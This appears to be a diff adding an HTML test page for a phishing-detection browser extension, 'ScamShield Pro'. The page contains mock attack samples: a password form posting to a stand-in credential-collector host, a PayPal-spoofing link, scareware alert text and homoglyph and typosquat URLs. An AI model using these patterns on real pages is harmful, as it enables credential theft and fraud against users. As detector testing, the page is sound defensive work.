@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ScamShield Pro — Live Attack Vector Test Lab</title>
+  <style>
+    :root {
+      --bg: #0b0f19;
+      --card-bg: #111827;
+      --card-border: #1f2937;
+      --text: #f3f4f6;
+      --text-muted: #9ca3af;
+      --accent: #38bdf8;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --success: #10b981;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      padding: 30px;
+      line-height: 1.5;
+    }
+    .container { max-width: 900px; margin: 0 auto; }
+    header {
+      margin-bottom: 30px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid var(--card-border);
+    }
+    h1 { font-size: 26px; color: #ffffff; display: flex; align-items: center; gap: 10px; }
+    .subtitle { color: var(--text-muted); font-size: 14px; margin-top: 6px; }
+    
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 24px; }
+    
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 12px;
+      padding: 20px;
+    }
+    .card-title {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .tag {
+      font-size: 11px;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 4px;
+      text-transform: uppercase;
+    }
+    .tag-danger { background: rgba(239, 68, 68, 0.2); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.4); }
+    .tag-warning { background: rgba(245, 158, 11, 0.2); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.4); }
+    .tag-success { background: rgba(16, 185, 129, 0.2); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.4); }
+
+    .test-desc { font-size: 13px; color: var(--text-muted); margin-bottom: 14px; }
+    
+    .test-box {
+      background: #060a12;
+      border: 1px solid #1e293b;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 13px;
+    }
+    
+    .test-box input[type="text"], .test-box input[type="password"] {
+      width: 100%;
+      background: #111827;
+      border: 1px solid #374151;
+      padding: 8px 10px;
+      border-radius: 6px;
+      color: #fff;
+      margin-bottom: 8px;
+    }
+    
+    .test-btn {
+      background: #2563eb;
+      color: white;
+      border: none;
+      padding: 8px 14px;
+      border-radius: 6px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .scam-link {
+      color: #38bdf8;
+      text-decoration: underline;
+      display: inline-block;
+      margin-top: 6px;
+    }
+
+    .scareware-box {
+      border-left: 4px solid var(--danger);
+      background: rgba(239, 68, 68, 0.08);
+      padding: 12px;
+      border-radius: 0 8px 8px 0;
+      font-size: 13px;
+    }
+
+    .instructions-card {
+      background: #0f172a;
+      border: 1px solid #38bdf8;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 24px;
+    }
+    .instructions-card h2 { font-size: 18px; color: var(--accent); margin-bottom: 10px; }
+    .instructions-card ol { margin-left: 20px; font-size: 14px; color: #e2e8f0; }
+    .instructions-card li { margin-bottom: 8px; }
+    code { background: #1e293b; padding: 2px 6px; border-radius: 4px; font-size: 13px; color: #38bdf8; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>🛡️ ScamShield Pro — Test Vector Lab</h1>
+      <p class="subtitle">This page contains mock phishing and credential-harvesting vectors designed to test ScamShield Pro's real-time detection heuristics.</p>
+    </header>
+
+    <div class="instructions-card">
+      <h2>🚀 Quick Test Instructions:</h2>
+      <ol>
+        <li>Make sure <strong>ScamShield Pro</strong> is loaded in <code>chrome://extensions</code> or <code>edge://extensions</code>.</li>
+        <li>Open this file in your browser: <code>file:///c:/Users/dell/Documents/scam-shield-extension/test-demo.html</code>.</li>
+        <li>Click the <strong>ScamShield Pro</strong> icon in your browser toolbar to see the live <strong>Threat Radar</strong>.</li>
+        <li>Switch to the <strong>Link Inspector</strong> tab in the popup and try auditing the sample phishing URLs listed below!</li>
+      </ol>
+    </div>
+
+    <div class="grid">
+      <!-- Test Vector 1 -->
+      <div class="card">
+        <div class="card-title">
+          <span>Vector 1: Cross-Origin Form</span>
+          <span class="tag tag-danger">Critical</span>
+        </div>
+        <p class="test-desc">A form with password input posting credentials to an external unauthorized origin (<code>http://scam-credential-collector.xyz/login</code>).</p>
+        <div class="test-box">
+          <form action="http://scam-credential-collector.xyz/login" method="POST">
+            <input type="text" placeholder="Username / Email" value="victim@example.com">
+            <input type="password" placeholder="Password" value="SecretPassword123">
+            <button type="button" class="test-btn">Simulate Submit</button>
+          </form>
+        </div>
+      </div>
+
+      <!-- Test Vector 2 -->
+      <div class="card">
+        <div class="card-title">
+          <span>Vector 2: Deceptive Anchor Link</span>
+          <span class="tag tag-warning">High Risk</span>
+        </div>
+        <p class="test-desc">Link text claims to be legitimate <code>https://paypal.com</code>, but actual <code>href</code> points to a third-party scam server.</p>
+        <div class="test-box">
+          <p>Click here to verify your account:</p>
+          <a href="https://paypal-security-account.tk/login" class="scam-link" target="_blank">
+            https://paypal.com/security-check
+          </a>
+        </div>
+      </div>
+
+      <!-- Test Vector 3 -->
+      <div class="card">
+        <div class="card-title">
+          <span>Vector 3: Tech Support Urgency</span>
+          <span class="tag tag-danger">Scareware</span>
+        </div>
+        <p class="test-desc">Scareware urgency phrases used in tech support phone and popup scams.</p>
+        <div class="scareware-box">
+          <strong>⚠️ Windows Defender Security Center Alert:</strong><br>
+          Your computer has been blocked due to critical error 0x80070422. System warning: infected with virus. Call Microsoft Support immediately at 1-800-XXX-XXXX!
+        </div>
+      </div>
+
+      <!-- Test Vector 4 -->
+      <div class="card">
+        <div class="card-title">
+          <span>Vector 4: Sample URLs for Inspector</span>
+          <span class="tag tag-success">Test List</span>
+        </div>
+        <p class="test-desc">Copy and paste any of these into the <strong>Link Inspector</strong> tab in ScamShield Pro:</p>
+        <div class="test-box" style="font-family: monospace; font-size: 12px; line-height: 1.8;">
+          • <code>https://pаypal-verify-account.tk/login</code> (Cyrillic homoglyph)<br>
+          • <code>https://goolge.com/signin</code> (Typosquatting)<br>
+          • <code>https://netflix.com.verify-billing.xyz</code> (Subdomain spoof)<br>
+          • <code>https://binance-claim-airdrop.top</code> (Combo-squat)<br>
+          • <code>https://github.com/trending</code> (Legitimate / Safe)
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
